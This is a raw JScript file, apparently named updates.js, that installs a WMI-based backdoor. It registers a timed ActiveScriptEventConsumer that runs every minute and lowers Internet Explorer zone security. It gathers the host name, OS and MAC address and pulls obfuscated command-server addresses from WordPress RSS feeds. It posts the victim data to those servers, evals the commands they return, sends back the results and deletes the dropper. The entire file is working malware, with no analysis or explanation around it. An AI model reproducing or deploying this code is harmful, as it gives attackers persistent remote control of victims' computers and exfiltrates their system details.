var scriptfilename="C:\\DOCUME~1\\mwsuser\\LOCALS~1\\Temp\\updates.js";var exefilename="c:\\m5d7gr\\gnf1xk.exe";var sXmlUrl="http://angelwings211.wordpress.com/feed/?rss=1;http://angelwings210.wordpress.com/feed/?rss=1;http://angelwings111.wordpress.com/feed/?rss=1";var sOwner="d";var ofso=new ActiveXObject("Scripting.FileSystemObject");while(ofso.FileExists(exefilename)){ofso.DeleteFile(exefilename);WScript.Sleep(1000);}var oWMI=GetObject("winmgmts:\\\\.\\root\\subscription");var InstallName="ProbeScriptKids";var InstallRunTimer=60000;var codestr="var MAIN=function(){$=this;$.key='W';$.sFeedUrl='"+sXmlUrl+"';$.sOwner='"+sOwner+"';$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.oIE=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='0.5.11';$.oWMI=null;$._x=ActiveXObject;$.sZone='HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\3';$.sReg1=$.sZone+'\\\\1201';$.sReg2=$.sZone+'\\\\1400';$.sReg3=$.sZone+'\\\\CurrentLevel';$.iVal1=$.iVal2=$.iVal3=0;$.sRegSearchPage='HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\Search Page';$.rd='REG_DWORD';$.rs='REG_SZ';$.ab='about:blank';};MAIN.prototype={InitObjects: function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.InitIE();$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo: function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress: function(){var e=new Enumerator($.WMI(\"Select * from Win32_NetworkAdapter where PNPDeviceID like '%PCI%' and NetConnectionStatus=2\"));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},InitIE: function(){$.oIE=new $._x('InternetExplorer.Application');$.oIE.visible=0;$.SetBlankSearch();$.SetLowZone();},CloseIE: function(){$.oHttp=null;$.oIE.quit();$.oIE=null;$.SetDefaultSearch();$.SetDefaultZone();},CleanObjects: function(){$.CloseIE();$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI(\"Select * from Win32_Process where Name='scrcons.exe'\"));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode) ;}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop: function(){$.oIE.gosearch();while($.oIE.busy||$.oIE.readystate!=4){}$.oIE.Document.write(\"<script>function CreateWinHttp(){return new ActiveXObject('WinHttp.WinHttpRequest.5.1')}</script>\");$.oHttp=$.oIE.Document.Script.CreateWinHttp();var feedUrlArry=$.sFeedUrl.split(';');for (var n=0;n<feedUrlArry.length;n++){try{var tstr=feedUrlArry[n].match('http://.*?\\\\.php');if(tstr!=null){$.sXmlUrl=tstr;}$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');oXml.loadXML(response);var items=oXml.selectNodes('//channel/item/title');var fd=new Array();for(var i=0,fc=0;i<items.length;i++){var item=items[i];var tmpstr=item.firstChild.nodeValue.match('@(.*)@');if(tmpstr!=null){fd[fc]=$.circleDecode(tmpstr[1]);fc++;}else{tmpstr=item.firstChild.nodeValue.match('http://.*?\\\\.php');if(tmpstr!=null){fd[fc]=tmpstr;fc++;}}}if(fd.length>0){$.sXmlUrl=fd[parseInt(Math.random()*fd.length)];break;}}catch(e){}}$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g, '');if(response.length>0){var commands=null;var oXml = new ActiveXObject('MSXML2.DOMDocument.3.0');oXml.loadXML(response);var container = oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){var commands=eval('('+container[i].text+')').command;}}if(commands!=null){var commandresult='';for(var i=0;i< commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\"'+commands[i].id+'\":\"'+escape(result)+'\"';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}}},SetBlankSearch:function(){$.sDefaultPage=$.oShell.regread($.sRegSearchPage);$.RW('$.sRegSearchPage','$.ab','$.rs');},SetDefaultSearch:function(){$.RW('$.sRegSearchPage','$.sDefaultPage','$.rs');},SetLowZone:function(){$.dVal1=$.oShell.regread($.sReg1);$.dVal2=$.oShell.regread($.sReg2);$.dVal3=$.oShell.regread($.sReg3);$.RW('$.sReg1','0','$.rd');$.RW('$.sReg2','0','$.rd');$.RW('$.sReg3','0','$.rd');},SetDefaultZone:function(){$.RW('$.sReg1','$.dVal1','$.rd');$.RW('$.sReg2','$.dVal2','$.rd');$.RW('$.sReg3','$.dVal3','$.rd');},RW:function(p1,p2,p3){var cms='$.oShell.';cms+='regwrite('+p1+','+p2+','+p3+');';eval(cms);},Fire: function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();";var Asec=oWMI.Get("ActiveScriptEventConsumer").Spawninstance_();Asec.Name=InstallName+"_consumer";Asec.ScriptingEngine="jscript";Asec.ScriptText=codestr;var Asecpath=Asec.put_();var WMITimer=oWMI.Get("__IntervalTimerInstruction").Spawninstance_();WMITimer.TimerID=InstallName+"_WMITimer";WMITimer.IntervalBetweenEvents=InstallRunTimer;WMITimer.SkipIfPassed=false;WMITimer.put_();var EventFilter=oWMI.Get("__EventFilter").Spawninstance_();EventFilter.Name=InstallName+"_filter";EventFilter.Query="select * from __timerevent where timerid=\""+InstallName+"_WMITimer\"";EventFilter.QueryLanguage="wql";var FilterPath=EventFilter.put_();var Binds=oWMI.Get("__FilterToConsumerBinding").Spawninstance_();Binds.Consumer=Asecpath.path;Binds.Filter=FilterPath.path;Binds.put_();if(ofso.FileExists(scriptfilename)){ofso.DeleteFile(scriptfilename);}